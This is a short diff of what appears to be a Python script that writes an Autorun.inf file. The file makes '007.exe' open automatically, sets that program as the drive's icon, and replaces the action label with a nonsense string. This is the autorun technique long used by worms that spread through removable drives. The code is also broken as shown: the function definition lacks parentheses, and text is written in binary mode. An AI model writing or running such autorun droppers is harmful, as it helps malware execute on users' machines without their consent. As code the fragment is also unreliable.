@@ -10,7 +10,8 @@ def writeconfig:
     autorun='''
     [autorun]
     open=007.exe
-    action=by him
+    icon=007.exe
+    action=walawalaningningwalaningning
     '''
     with open("Autorun.inf",'wb') as loadautorun:
         loadautorun.write(autorun)
